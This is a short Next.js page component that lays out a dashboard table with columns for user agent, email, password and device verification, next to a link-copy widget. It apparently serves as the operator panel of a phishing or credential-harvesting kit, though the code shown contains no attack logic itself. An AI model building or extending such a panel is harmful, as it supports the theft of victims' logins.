import LinkCopy from "@/components/LinkCopy";
import Navbar from "@/components/Navbar";
import DashboardDataTable from "@/components/DashboardDataTable";

export default function Page() {
  return (
    <>
      <Navbar />
      <div className="flex items-center flex-col justify-center ">
        <div className="w-full">
          <LinkCopy />
        </div>
        <div className="w-full sm:w-2/3">
          <div className="overflow-x-auto">
            <table className="w-full min-w-full border-collapse">
              <thead>
                <tr>
                  <th className="px-4 border py-2">User Agent</th>
                  <th className="px-4 border py-2">Email</th>
                  <th className="px-4 border py-2">Password</th>
                  <th className="px-4 border py-2">Verify devices</th>
                </tr>
              </thead>
              <DashboardDataTable />
            </table>
          </div>
        </div>
      </div>
    </>
  );
}
